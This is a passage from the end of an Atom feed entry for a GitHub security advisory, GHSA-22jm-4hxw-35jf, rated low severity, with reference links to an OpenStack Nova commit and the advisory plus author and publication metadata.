<li><a href="https://github.com/openstack/nova/commit/d8fbf04f325f593836f8d44b6bbf42b85bde94e3">https://github.com/openstack/nova/commit/d8fbf04f325f593836f8d44b6bbf42b85bde94e3</a></li>
<li><a href="https://github.com/advisories/GHSA-22jm-4hxw-35jf">https://github.com/advisories/GHSA-22jm-4hxw-35jf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22jm-4hxw-35jf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-05-24T17:09:18.000Z</published>
    </entry>
</feed>